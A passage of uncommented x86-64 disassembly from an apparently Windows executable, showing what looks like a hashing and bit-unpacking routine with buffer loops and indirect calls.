   14004feab:	mov    eax,DWORD PTR [rbp+0x488]
   14004feb1:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004feb8:	mov    DWORD PTR [rbp+0x7e0],eax
   14004febe:	and    DWORD PTR [rbp+0x7e4],0x0
   14004fec5:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   14004fecc:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   14004fed3:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   14004feda:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   14004fee1:	lea    rax,[rbp+0x7e8]
   14004fee8:	movups XMMWORD PTR [rax+0x30],xmm3
   14004feec:	movups XMMWORD PTR [rax+0x20],xmm2
   14004fef0:	movups XMMWORD PTR [rax+0x10],xmm1
   14004fef4:	movups XMMWORD PTR [rax],xmm0
   14004fef7:	call   0x140064214
   14004fefc:	mov    al,BYTE PTR [rip+0x48b8b]        # 0x140098a8d
   14004ff02:	cmp    al,0x1
   14004ff04:	je     0x14004ff4d
   14004ff06:	movzx  eax,al
   14004ff09:	cmp    eax,0x2
   14004ff0c:	je     0x14004fff3
   14004ff12:	and    DWORD PTR [rbp+0xf80],0x0
   14004ff19:	lea    rcx,[rip+0xfffffffffffb1160]        # 0x140001080
   14004ff20:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004ff27:	push   0x40
   14004ff29:	pop    r8
   14004ff2b:	lea    r9,[rbp+0xf80]
   14004ff32:	call   QWORD PTR [rip+0x448d0]        # 0x140094808
   14004ff38:	test   eax,eax
   14004ff3a:	sete   cl
   14004ff3d:	inc    cl
   14004ff3f:	mov    BYTE PTR [rip+0x48b48],cl        # 0x140098a8d
   14004ff45:	test   eax,eax
   14004ff47:	je     0x14004fff3
   14004ff4d:	mov    al,BYTE PTR [rip+0x48c65]        # 0x140098bb8
   14004ff53:	cmp    al,0x1
   14004ff55:	je     0x14004ff7a
   14004ff57:	movzx  eax,al
   14004ff5a:	test   eax,eax
   14004ff5c:	jne    0x14004fff3
   14004ff62:	call   0x140065d51
   14004ff67:	test   rax,rax
   14004ff6a:	sete   cl
   14004ff6d:	inc    cl
   14004ff6f:	mov    BYTE PTR [rip+0x48c43],cl        # 0x140098bb8
   14004ff75:	test   rax,rax
   14004ff78:	je     0x14004fff3
   14004ff7a:	call   0x140064227
   14004ff7f:	mov    eax,0xc8c291de
   14004ff84:	xchg   DWORD PTR [rip+0x48b56],eax        # 0x140098ae0
   14004ff8a:	call   QWORD PTR [rip+0x446c0]        # 0x140094650
   14004ff90:	mov    eax,eax
   14004ff92:	mov    QWORD PTR [rip+0x48067],rax        # 0x140098000
   14004ff99:	lea    rcx,[rbp+0x7d0]
   14004ffa0:	push   0xffffffffffffffff
   14004ffa2:	pop    rdx
   14004ffa3:	call   0x140010840
   14004ffa8:	xor    eax,eax
   14004ffaa:	xchg   DWORD PTR [rip+0x48b30],eax        # 0x140098ae0
   14004ffb0:	mov    BYTE PTR [rip+0x48ad7],0x0        # 0x140098a8e
   14004ffb7:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004ffbd:	add    DWORD PTR [rbp+0x478],eax
   14004ffc3:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004ffc9:	add    DWORD PTR [rbp+0x47c],eax
   14004ffcf:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004ffd5:	add    DWORD PTR [rbp+0x480],eax
   14004ffdb:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004ffe1:	add    DWORD PTR [rbp+0x484],eax
   14004ffe7:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004ffed:	add    DWORD PTR [rbp+0x488],eax
   14004fff3:	mov    BYTE PTR [rip+0x48a92],0x0        # 0x140098a8c
   14004fffa:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140050001:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140050008:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14005000f:	xor    eax,eax
   140050011:	cmp    rax,0x14
   140050015:	je     0x14005002d
   140050017:	mov    ecx,DWORD PTR [rbp+rax*1+0x478]
   14005001e:	bswap  ecx
   140050020:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140050027:	add    rax,0x4
   14005002b:	jmp    0x140050011
   14005002d:	mov    r8,QWORD PTR [rbp+0x410]
   140050034:	mov    eax,r13d
   140050037:	shr    eax,0x3
   14005003a:	and    eax,0x1f
   14005003d:	lea    rcx,[rax+rbp*1]
   140050041:	add    rcx,0x7d0
   140050048:	xor    r9d,r9d
   14005004b:	xor    edx,edx
   14005004d:	xor    eax,eax
   14005004f:	cmp    r9,0x10
   140050053:	je     0x14005006e
   140050055:	shld   rax,rdx,0x8
   14005005a:	mov    r10,rdx
   14005005d:	shl    r10,0x8
   140050061:	movzx  edx,BYTE PTR [rcx+r9*1]
   140050066:	inc    r9
   140050069:	or     rdx,r10
   14005006c:	jmp    0x14005004f
   14005006e:	push   0xffffffffffffffff
   140050070:	pop    r9
   140050072:	mov    r10,r9
   140050075:	mov    ecx,r8d
   140050078:	shl    r10,cl
   14005007b:	cmp    r8,0x40
   14005007f:	not    r10
   140050082:	cmovae r10,r9
   140050086:	and    r13d,0x7
   14005008a:	lea    ecx,[r8+r13*1]
   14005008e:	neg    cl
   140050090:	shrd   rdx,rax,cl
   140050094:	shr    rax,cl
   140050097:	test   cl,0x40
   14005009a:	cmove  rax,rdx
   14005009e:	and    rax,r10
   1400500a1:	mov    rsi,QWORD PTR [rbp+0x450]
   1400500a8:	add    r8,0x7
   1400500ac:	bswap  rax
   1400500af:	shr    r8,0x3
   1400500b3:	mov    QWORD PTR [rbp+0xd10],rax
   1400500ba:	mov    r9,rsi
   1400500bd:	imul   r9,r8
   1400500c1:	push   0x8
   1400500c3:	pop    rcx
   1400500c4:	sub    rcx,r8
   1400500c7:	dec    r8
   1400500ca:	mov    rax,QWORD PTR [rbp+0x6f8]
   1400500d1:	lea    r11,[rax+r9*1]
   1400500d5:	mov    rax,r9
   1400500d8:	xor    edx,edx
   1400500da:	push   0x14
   1400500dc:	pop    rdi
   1400500dd:	div    rdi
   1400500e0:	cmp    rcx,0x8
   1400500e4:	je     0x14005010a
   1400500e6:	cmp    r8,0x7
   1400500ea:	ja     0x140059d80
   1400500f0:	imul   rax,rax,0xffffffffffffffec
   1400500f4:	mov    al,BYTE PTR [r11+rax*1]
   1400500f8:	xor    BYTE PTR [rbp+rcx*1+0xd10],al
   1400500ff:	inc    rcx
   140050102:	inc    r11
   140050105:	inc    r9
   140050108:	jmp    0x1400500d5
   14005010a:	mov    r11,QWORD PTR [rbp+0xd10]
   140050111:	bswap  r11
   140050114:	and    r11,r10
   140050117:	inc    rsi
   14005011a:	mov    QWORD PTR [rbp+0x450],rsi
   140050121:	mov    r9,QWORD PTR [rbp+0x4c0]
   140050128:	mov    rax,QWORD PTR [rbp+0x4b0]
   14005012f:	mov    r8,QWORD PTR [rbp+0x4b8]
   140050136:	mov    rdx,r9
   140050139:	sub    rdx,r8
   14005013c:	sub    rdx,rax
   14005013f:	mov    rcx,QWORD PTR [rbp+0x410]
   140050146:	cmp    rdx,rcx
   140050149:	cmovae rdx,rcx
   14005014d:	cmp    rdx,0x1
   140050151:	adc    rdx,0x0
   140050155:	mov    r10d,ecx
   140050158:	sub    r10d,edx
   14005015b:	and    r10b,0x3f
   14005015f:	cmp    rcx,rdx
   140050162:	movzx  ecx,r10b
   140050166:	mov    r10d,0x0
   14005016c:	cmovbe ecx,r10d
   140050170:	shr    r11,cl
   140050173:	mov    r10,QWORD PTR [rbp+0x4a0]
   14005017a:	mov    rsi,QWORD PTR [rbp+0x4a8]
   140050181:	mov    ecx,edx
   140050183:	shld   rsi,r10,cl
   140050187:	shl    r10,cl
   14005018a:	test   dl,0x40
   14005018d:	cmovne rsi,r10
   140050191:	mov    ecx,0x0
   140050196:	cmove  rcx,r10
   14005019a:	or     rcx,r11
   14005019d:	mov    QWORD PTR [rbp+0x4a8],rsi
   1400501a4:	mov    QWORD PTR [rbp+0x4a0],rcx
   1400501ab:	add    rax,rdx
   1400501ae:	mov    QWORD PTR [rbp+0x4b0],rax
   1400501b5:	jmp    0x14004fc62
   1400501ba:	add    rax,0xfffffffffffffff8
   1400501be:	mov    QWORD PTR [rbp+0x4b0],rax
   1400501c5:	mov    r9,QWORD PTR [rbp+0x4a8]
   1400501cc:	mov    r10,r9
   1400501cf:	mov    ecx,eax
   1400501d1:	shr    r10,cl
   1400501d4:	mov    r11,QWORD PTR [rbp+0x4a0]
   1400501db:	mov    rdx,r11
   1400501de:	shrd   rdx,r9,cl
   1400501e2:	push   0xffffffffffffffff
   1400501e4:	pop    rdi
   1400501e5:	mov    rsi,rdi
   1400501e8:	shl    rsi,cl
   1400501eb:	test   al,0x40
   1400501ed:	cmovne rdx,r10
   1400501f1:	mov    ecx,0x0
   1400501f6:	cmove  rcx,rsi
   1400501fa:	cmove  rsi,rdi
   1400501fe:	not    rsi
   140050201:	not    rcx
   140050204:	and    rcx,r11
   140050207:	and    rsi,r9
   14005020a:	test   rax,rax
   14005020d:	cmove  rsi,rax
   140050211:	cmove  rcx,rax
   140050215:	mov    QWORD PTR [rbp+0x4a0],rcx
   14005021c:	mov    QWORD PTR [rbp+0x4a8],rsi
   140050223:	add    r8,0x8
   140050227:	mov    QWORD PTR [rbp+0x4b8],r8
   14005022e:	xor    r15d,edx
   140050231:	mov    rcx,QWORD PTR [rbp+0x390]
   140050238:	mov    rax,rcx
   14005023b:	xor    edx,edx
   14005023d:	push   0x5
   14005023f:	pop    r9
   140050241:	div    r9
   140050244:	mov    eax,edx
   140050246:	movzx  edx,r15b
   14005024a:	xor    edx,DWORD PTR [rbp+rax*4+0x398]
   140050251:	imul   r8d,edx,0x24713b5
   140050258:	rol    r8d,0xd
   14005025c:	mov    DWORD PTR [rbp+rax*4+0x398],r8d
   140050264:	lea    rax,[rcx+0x2]
   140050268:	xor    edx,edx
   14005026a:	div    r9
   14005026d:	mov    eax,edx
   14005026f:	mov    edx,DWORD PTR [rbp+rax*4+0x398]
   140050276:	rol    edx,0x7
   140050279:	inc    rbx
   14005027c:	xor    edx,r8d
   14005027f:	mov    DWORD PTR [rbp+rax*4+0x398],edx
   140050286:	inc    rcx
   140050289:	jmp    0x14004f63b
   14005028e:	mov    rax,QWORD PTR [rbp+0x390]
   140050295:	mov    rcx,QWORD PTR [rbp+0x398]
   14005029c:	movups xmm0,XMMWORD PTR [rbp+0x3a0]
   1400502a3:	movaps XMMWORD PTR [rbp+0x7e0],xmm0
   1400502aa:	mov    QWORD PTR [rbp+0x7d0],rax
   1400502b1:	mov    QWORD PTR [rbp+0x7d8],rcx
   1400502b8:	lea    rdi,[rbp+0x1bc]
   1400502bf:	mov    rcx,rdi
   1400502c2:	lea    rsi,[rbp+0x7d0]
   1400502c9:	mov    rdx,rsi
   1400502cc:	call   0x14006409d
   1400502d1:	mov    eax,DWORD PTR [rbp+0x7b4]
   1400502d7:	mov    DWORD PTR [rbp+0x7d0],eax
   1400502dd:	mov    rax,QWORD PTR [rbp+0x6d0]
   1400502e4:	mov    DWORD PTR [rbp+0x7d4],eax
   1400502ea:	mov    rax,QWORD PTR [rbp+0x5d8]
   1400502f1:	mov    QWORD PTR [rbp+0x7d8],rax
   1400502f8:	mov    eax,DWORD PTR [rbp+0x6e4]
   1400502fe:	mov    DWORD PTR [rbp+0x7e0],eax
   140050304:	lea    rcx,[rbp+0xf80]
   14005030b:	mov    rdx,rsi
   14005030e:	mov    r8,rdi
   140050311:	call   0x1400641c0
   140050316:	mov    ebx,DWORD PTR [rbp+0xf80]
   14005031c:	mov    r14d,DWORD PTR [rbp+0xf84]
   140050323:	mov    r15d,DWORD PTR [rbp+0xf88]
   14005032a:	mov    r12d,DWORD PTR [rbp+0xf8c]
   140050331:	mov    r13d,DWORD PTR [rbp+0xf90]
   140050338:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14005033f:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140050346:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14005034d:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140050354:	xor    esi,esi
   140050356:	cmp    rsi,0x14
   14005035a:	je     0x1400503aa
   14005035c:	lea    rdi,[rsi+0x4]
   140050360:	mov    rcx,rsi
   140050363:	mov    rdx,rdi
   140050366:	lea    r8,[rbp+0x1060]
   14005036d:	lea    r9,[rip+0x37ddc]        # 0x140088150
   140050374:	call   0x14003ad60
   140050379:	mov    ecx,DWORD PTR [rbp+rsi*1+0xf80]
   140050380:	mov    DWORD PTR [rbp+0x7d0],ecx
   140050386:	lea    rcx,[rip+0x37ddb]        # 0x140088168
   14005038d:	mov    QWORD PTR [rsp+0x20],rcx
   140050392:	mov    rcx,rax
   140050395:	lea    r8,[rbp+0x7d0]
   14005039c:	push   0x4
   14005039e:	pop    r9
   1400503a0:	call   0x1400638fe
   1400503a5:	mov    rsi,rdi
   1400503a8:	jmp    0x140050356
   1400503aa:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   1400503b1:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   1400503b8:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   1400503bf:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   1400503c6:	xor    eax,eax
   1400503c8:	cmp    rax,0x40
   1400503cc:	je     0x1400503e4
   1400503ce:	mov    ecx,DWORD PTR [rbp+rax*1+0x1060]
   1400503d5:	bswap  ecx
   1400503d7:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   1400503de:	add    rax,0x4
   1400503e2:	jmp    0x1400503c8
   1400503e4:	mov    DWORD PTR [rbp+0x7d0],ebx
   1400503ea:	mov    DWORD PTR [rbp+0x7d4],r14d
   1400503f1:	mov    DWORD PTR [rbp+0x7d8],r15d
   1400503f8:	mov    DWORD PTR [rbp+0x7dc],r12d
   1400503ff:	mov    DWORD PTR [rbp+0x7e0],r13d
   140050406:	and    DWORD PTR [rbp+0x7e4],0x0
   14005040d:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140050414:	movaps xmm1,XMMWORD PTR [rbp+0xd20]
   14005041b:	movaps xmm2,XMMWORD PTR [rbp+0xd30]
   140050422:	movaps xmm3,XMMWORD PTR [rbp+0xd40]
   140050429:	lea    rax,[rbp+0x7e8]
   140050430:	movups XMMWORD PTR [rax+0x30],xmm3
   140050434:	movups XMMWORD PTR [rax+0x20],xmm2
   140050438:	movups XMMWORD PTR [rax+0x10],xmm1
   14005043c:	movups XMMWORD PTR [rax],xmm0
   14005043f:	call   0x140064214
   140050444:	mov    al,BYTE PTR [rip+0x48643]        # 0x140098a8d
   14005044a:	mov    DWORD PTR [rbp+0x4f8],0x0
   140050454:	cmp    al,0x1
   140050456:	je     0x14005049f
   140050458:	movzx  eax,al
   14005045b:	cmp    eax,0x2
   14005045e:	je     0x14005057b
   140050464:	and    DWORD PTR [rbp+0x500],0x0
   14005046b:	lea    rcx,[rip+0xfffffffffffb0c0e]        # 0x140001080
   140050472:	mov    rdx,QWORD PTR [rbp+0x1150]
   140050479:	push   0x40
   14005047b:	pop    r8
   14005047d:	lea    r9,[rbp+0x500]
   140050484:	call   QWORD PTR [rip+0x4437e]        # 0x140094808
   14005048a:	test   eax,eax
   14005048c:	sete   cl
   14005048f:	inc    cl
   140050491:	mov    BYTE PTR [rip+0x485f6],cl        # 0x140098a8d
   140050497:	test   eax,eax
   140050499:	je     0x14005057b
   14005049f:	mov    al,BYTE PTR [rip+0x48713]        # 0x140098bb8
   1400504a5:	cmp    al,0x1
   1400504a7:	je     0x1400504f8
   1400504a9:	movzx  eax,al
   1400504ac:	test   eax,eax
   1400504ae:	jne    0x14005057b
   1400504b4:	call   0x140065d51
   1400504b9:	test   rax,rax
   1400504bc:	sete   cl
   1400504bf:	inc    cl
   1400504c1:	mov    BYTE PTR [rip+0x486f1],cl        # 0x140098bb8
   1400504c7:	mov    DWORD PTR [rbp+0x6e8],0x0
   1400504d1:	mov    DWORD PTR [rbp+0x6ec],0x0
   1400504db:	mov    DWORD PTR [rbp+0x6f0],0x0
   1400504e5:	mov    DWORD PTR [rbp+0x6f4],0x0
   1400504ef:	test   rax,rax
   1400504f2:	je     0x1400505a3
   1400504f8:	call   0x140064227
   1400504fd:	mov    eax,0xc8c291de
   140050502:	xchg   DWORD PTR [rip+0x485d8],eax        # 0x140098ae0
   140050508:	call   QWORD PTR [rip+0x44142]        # 0x140094650
   14005050e:	mov    eax,eax
   140050510:	mov    QWORD PTR [rip+0x47ae9],rax        # 0x140098000
   140050517:	lea    rcx,[rbp+0x7d0]
   14005051e:	push   0xffffffffffffffff
   140050520:	pop    rdx
   140050521:	call   0x140001080
   140050526:	xor    eax,eax
   140050528:	xchg   DWORD PTR [rip+0x485b2],eax        # 0x140098ae0
   14005052e:	mov    BYTE PTR [rip+0x48559],0x0        # 0x140098a8e
   140050535:	add    ebx,DWORD PTR [rbp+0x7d0]
   14005053b:	add    r14d,DWORD PTR [rbp+0x7d4]
   140050542:	add    r15d,DWORD PTR [rbp+0x7d8]
   140050549:	add    r12d,DWORD PTR [rbp+0x7dc]
   140050550:	add    r13d,DWORD PTR [rbp+0x7e0]
   140050557:	mov    DWORD PTR [rbp+0x4f8],r13d
   14005055e:	mov    DWORD PTR [rbp+0x6e8],r12d
   140050565:	mov    DWORD PTR [rbp+0x6ec],r15d
   14005056c:	mov    DWORD PTR [rbp+0x6f0],r14d
   140050573:	mov    DWORD PTR [rbp+0x6f4],ebx
   140050579:	jmp    0x1400505a3
   14005057b:	mov    DWORD PTR [rbp+0x6e8],0x0
   140050585:	mov    DWORD PTR [rbp+0x6ec],0x0
   14005058f:	mov    DWORD PTR [rbp+0x6f0],0x0
   140050599:	mov    DWORD PTR [rbp+0x6f4],0x0
   1400505a3:	mov    BYTE PTR [rip+0x484e2],0x0        # 0x140098a8c
   1400505aa:	mov    QWORD PTR [rbp+0x700],0x0
   1400505b5:	mov    QWORD PTR [rbp+0x698],0x0
   1400505c0:	mov    rax,QWORD PTR [rbp+0x698]
   1400505c7:	cmp    rax,QWORD PTR [rbp+0xf78]
   1400505ce:	je     0x14004a876
   1400505d4:	mov    rax,QWORD PTR [rbp+0x700]
   1400505db:	inc    rax
   1400505de:	cmp    rax,QWORD PTR [rbp+0xf78]
   1400505e5:	mov    esi,0x0
   1400505ea:	cmove  rax,rsi
   1400505ee:	mov    QWORD PTR [rbp+0x708],rax
   1400505f5:	mov    rax,QWORD PTR [rbp+0x698]
   1400505fc:	mov    rax,QWORD PTR [rbp+rax*8-0x48]
   140050601:	shr    rax,0x4
   140050605:	mov    QWORD PTR [rbp+0xf68],rax
   14005060c:	cmp    QWORD PTR [rbp+0x6a0],rax
   140050613:	setne  BYTE PTR [rbp+0xca8]
   14005061a:	mov    rax,QWORD PTR [rbp+0x200]
   140050621:	mov    QWORD PTR [rbp+0x1178],rax
   140050628:	lea    rax,[rbp+0x208]
   14005062f:	movups xmm0,XMMWORD PTR [rax]
   140050632:	movups xmm1,XMMWORD PTR [rax+0x10]
   140050636:	movaps XMMWORD PTR [rbp+0xcc0],xmm0
   14005063d:	movaps XMMWORD PTR [rbp+0xcd0],xmm1
   140050644:	mov    rax,QWORD PTR [rax+0x20]
   140050648:	mov    QWORD PTR [rbp+0xce0],rax
   14005064f:	mov    edx,0x4000
   140050654:	lea    rcx,[rip+0x2f3f5]        # 0x14007fa50
   14005065b:	call   0x14003bee8
   140050660:	mov    rbx,rax
   140050663:	add    rax,0x10
   140050667:	sub    rdx,0x10
   14005066b:	mov    QWORD PTR [rbp+0x1160],rdx
   140050672:	cmovb  rax,rsi
   140050676:	mov    QWORD PTR [rbp+0x1170],rax
   14005067d:	jb     0x14005a158
   140050683:	mov    rax,QWORD PTR [rbp+0x1178]
   14005068a:	add    rax,0xffffffffffffffbf
   14005068e:	cmp    rax,0xffffffffffffffc0
   140050692:	jb     0x14005a158
   140050698:	cmp    QWORD PTR [rbp+0x1160],0x0
   1400506a0:	je     0x14005a158
   1400506a6:	inc    QWORD PTR [rbp+0x698]
   1400506ad:	mov    rcx,QWORD PTR [rbp+0x1158]
   1400506b4:	lea    rdx,[rbp+0x3b0]
   1400506bb:	call   0x14003ad8d
   1400506c0:	lea    r14,[rbx+0x10]
   1400506c4:	mov    rcx,r14
   1400506c7:	mov    rdi,QWORD PTR [rbp+0x1160]
   1400506ce:	mov    rdx,rdi
   1400506d1:	call   0x14003adcf
   1400506d6:	mov    rsi,QWORD PTR [rbp+0x1178]
   1400506dd:	mul    rsi
   1400506e0:	mov    r8,rax
   1400506e3:	push   0xffffffffffffffff
   1400506e5:	pop    rax
   1400506e6:	cmovo  r8,rax
   1400506ea:	mov    rcx,r8
   1400506ed:	sub    rcx,0x20
   1400506f1:	mov    eax,0x0
   1400506f6:	cmovb  rcx,rax
   1400506fa:	mov    QWORD PTR [rbp+0x1138],rcx
   140050701:	mov    QWORD PTR [rbp+0x7d0],r14
   140050708:	mov    QWORD PTR [rbp+0x7d8],rdi
   14005070f:	mov    QWORD PTR [rbp+0x7e0],rsi
   140050716:	lea    rdx,[rbp+0x208]
   14005071d:	movups xmm0,XMMWORD PTR [rdx]
   140050720:	movups xmm1,XMMWORD PTR [rdx+0x10]
   140050724:	lea    rcx,[rbp+0x7e8]
   14005072b:	movups XMMWORD PTR [rcx],xmm0
   14005072e:	movups XMMWORD PTR [rcx+0x10],xmm1
   140050732:	mov    rax,QWORD PTR [rdx+0x20]
   140050736:	mov    QWORD PTR [rcx+0x20],rax
   14005073a:	lea    rcx,[rbp+0x7d8]
   140050741:	and    QWORD PTR [rcx+0x48],0x0
   140050746:	movaps XMMWORD PTR [rcx+0x38],xmm7
   14005074a:	mov    QWORD PTR [rbp+0x828],rdi
   140050751:	mov    rax,QWORD PTR [rbp+0x600]
   140050758:	mov    QWORD PTR [rbp+0x830],rax
   14005075f:	mov    rax,QWORD PTR [rbp+0x4f0]
   140050766:	mov    QWORD PTR [rbp+0x838],rax
   14005076d:	mov    rax,QWORD PTR [rbp+0x7b8]
   140050774:	mov    QWORD PTR [rbp+0x840],rax
   14005077b:	mov    eax,DWORD PTR [rbp+0x3c0]
   140050781:	mov    DWORD PTR [rcx+0x80],eax
   140050787:	movaps xmm0,XMMWORD PTR [rbp+0x3b0]
   14005078e:	movups XMMWORD PTR [rcx+0x70],xmm0
   140050792:	mov    rax,QWORD PTR [rbp+0xcb0]
   140050799:	movaps XMMWORD PTR [rax+0x10],xmm7
   14005079d:	movaps XMMWORD PTR [rax],xmm7
   1400507a0:	mov    QWORD PTR [rbp+0x1180],r8
   1400507a7:	mov    QWORD PTR [rbp+0x890],r8
   1400507ae:	lea    rcx,[rbp+0x710]
   1400507b5:	push   0x4
   1400507b7:	pop    rdx
   1400507b8:	call   0x14003c111
   1400507bd:	xor    r15d,r15d
   1400507c0:	xor    edi,edi
   1400507c2:	xor    r12d,r12d
   1400507c5:	xor    r13d,r13d
   1400507c8:	xor    r14d,r14d
   1400507cb:	mov    QWORD PTR [rbp+0x1148],0x0
   1400507d6:	cmp    QWORD PTR [rbp+0x1148],0x4
   1400507de:	je     0x140050dd5
   1400507e4:	lea    rax,[r14+0x8]
   1400507e8:	cmp    rax,QWORD PTR [rbp+0x1180]
   1400507ef:	jbe    0x1400507f8
   1400507f1:	xor    edx,edx
   1400507f3:	jmp    0x140050dbd
   1400507f8:	cmp    r13,0x8
   1400507fc:	jae    0x140050d4a
   140050802:	cmp    r15,QWORD PTR [rbp+0x828]
   140050809:	jae    0x14005084f
   14005080b:	mov    rax,QWORD PTR [rbp+0x7d8]
   140050812:	mov    rcx,QWORD PTR [rbp+0x818]
   140050819:	cmp    rcx,rax
   14005081c:	jae    0x14005084f
   14005081e:	lea    rdx,[rbx+0x10]
   140050822:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   140050827:	and    r13d,0x7f
   14005082b:	lea    rdx,[rcx+0x1]
   14005082f:	cmp    rdx,rax
   140050832:	jae    0x14005085c
   140050834:	movzx  r8d,BYTE PTR [rbx+rcx*1+0x11]
   14005083a:	test   r8b,r8b
   14005083d:	jns    0x140050856
   14005083f:	shl    r13,0x7
   140050843:	and    r8d,0x7f
   140050847:	or     r13,r8
   14005084a:	mov    rcx,rdx
   14005084d:	jmp    0x14005082b
   14005084f:	xor    edx,edx
   140050851:	jmp    0x140050cd9
   140050856:	inc    rcx
   140050859:	mov    rax,rcx
   14005085c:	mov    QWORD PTR [rbp+0x818],rax
   140050863:	mov    rax,r13
   140050866:	shr    rax,0x8
   14005086a:	mov    rsi,r13
   14005086d:	shr    rsi,0x28
   140050871:	movaps XMMWORD PTR [rbp+0x530],xmm7
   140050878:	movaps XMMWORD PTR [rbp+0x520],xmm7
   14005087f:	movaps XMMWORD PTR [rbp+0x510],xmm7
   140050886:	movaps XMMWORD PTR [rbp+0x500],xmm7
   14005088d:	mov    DWORD PTR [rbp+0x1060],eax
   140050893:	lea    rax,[rip+0x377be]        # 0x140088058
   14005089a:	mov    QWORD PTR [rsp+0x20],rax
   14005089f:	lea    rcx,[rbp+0x500]
   1400508a6:	push   0x4
   1400508a8:	pop    rdx
   1400508a9:	lea    r8,[rbp+0x1060]
   1400508b0:	mov    r9,rdx
   1400508b3:	call   0x1400638fe
   1400508b8:	mov    BYTE PTR [rbp+0x504],sil
   1400508bf:	mov    rsi,QWORD PTR [rbp+0x7f0]
   1400508c6:	cmp    QWORD PTR [rbp+0x838],rsi
   1400508cd:	jbe    0x1400509f9
   1400508d3:	mov    r9,QWORD PTR [rbp+0x7f8]
   1400508da:	cmp    r9,0x4
   1400508de:	ja     0x140059d9c
   1400508e4:	mov    rcx,QWORD PTR [rbp+0x800]
   1400508eb:	cmp    rcx,0x5
   1400508ef:	jae    0x140059dae
   1400508f5:	mov    r14,QWORD PTR [rbp+0x838]
   1400508fc:	cmp    r14,rsi
   1400508ff:	je     0x140059dbc
   140050905:	mov    r8,r14
   140050908:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14005090f:	mov    cl,BYTE PTR [rbp+0x808]
   140050915:	rol    eax,cl
   140050917:	sub    r8,rsi
   14005091a:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140050922:	xor    edx,edx
   140050924:	div    r8
   140050927:	mov    rdi,rdx
   14005092a:	mov    rax,QWORD PTR [rbp+0x840]
   140050931:	mov    QWORD PTR [rbp+0xf80],rax
   140050938:	cmp    rsi,0x40
   14005093c:	push   0x40
   14005093e:	pop    rax
   14005093f:	cmovae rsi,rax
   140050943:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14005094a:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140050951:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140050958:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14005095f:	lea    rcx,[rbp+0x1060]
   140050966:	mov    rdx,rsi
   140050969:	call   0x14003c0b8
   14005096e:	test   r14,r14
   140050971:	je     0x1400509bf
   140050973:	mov    rcx,rax
   140050976:	mov    r8,rdx
   140050979:	mov    rax,rdx
   14005097c:	add    rax,rdi
   14005097f:	mov    r9,QWORD PTR [rbp+0x830]
   140050986:	cmp    rax,r14
   140050989:	jbe    0x1400509a9
   14005098b:	xor    r10d,r10d
   14005098e:	cmp    r8,r10
   140050991:	je     0x1400509bf
   140050993:	lea    rax,[r10+rdi*1]
   140050997:	xor    edx,edx
   140050999:	div    r14
   14005099c:	mov    al,BYTE PTR [r9+rdx*1]
   1400509a0:	mov    BYTE PTR [rcx+r10*1],al
   1400509a4:	inc    r10
   1400509a7:	jmp    0x14005098e
   1400509a9:	add    r9,rdi
   1400509ac:	xor    eax,eax
   1400509ae:	cmp    r8,rax
   1400509b1:	je     0x1400509bf
   1400509b3:	mov    dl,BYTE PTR [r9+rax*1]
   1400509b7:	mov    BYTE PTR [rcx+rax*1],dl
   1400509ba:	inc    rax
   1400509bd:	jmp    0x1400509ae
   1400509bf:	mov    rcx,QWORD PTR [rbp+0x7e8]
   1400509c6:	xor    eax,eax
   1400509c8:	cmp    rsi,rax
   1400509cb:	je     0x1400509f9
   1400509cd:	cmp    rcx,0x3f
   1400509d1:	ja     0x140059d8e
   1400509d7:	mov    edx,eax
   1400509d9:	and    edx,0x7
   1400509dc:	mov    dl,BYTE PTR [rbp+rdx*1+0xf80]
   1400509e3:	xor    dl,BYTE PTR [rbp+rax*1+0x1060]
   1400509ea:	inc    rax
   1400509ed:	mov    BYTE PTR [rbp+rcx*1+0x500],dl
   1400509f4:	inc    rcx
   1400509f7:	jmp    0x1400509c8
   1400509f9:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140050a00:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140050a07:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140050a0e:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140050a15:	xor    eax,eax
   140050a17:	cmp    rax,0x40
   140050a1b:	je     0x140050a33
   140050a1d:	mov    ecx,DWORD PTR [rbp+rax*1+0x500]
   140050a24:	bswap  ecx
   140050a26:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   140050a2d:	add    rax,0x4
   140050a31:	jmp    0x140050a17
   140050a33:	movups xmm0,XMMWORD PTR [rbp+0x848]
   140050a3a:	mov    eax,DWORD PTR [rbp+0x858]
   140050a40:	movups XMMWORD PTR [rbp+0x1060],xmm0
   140050a47:	mov    DWORD PTR [rbp+0x1070],eax
   140050a4d:	and    DWORD PTR [rbp+0x1074],0x0
   140050a54:	movaps xmm0,XMMWORD PTR [rbp+0xf80]
   140050a5b:	movaps xmm1,XMMWORD PTR [rbp+0xf90]
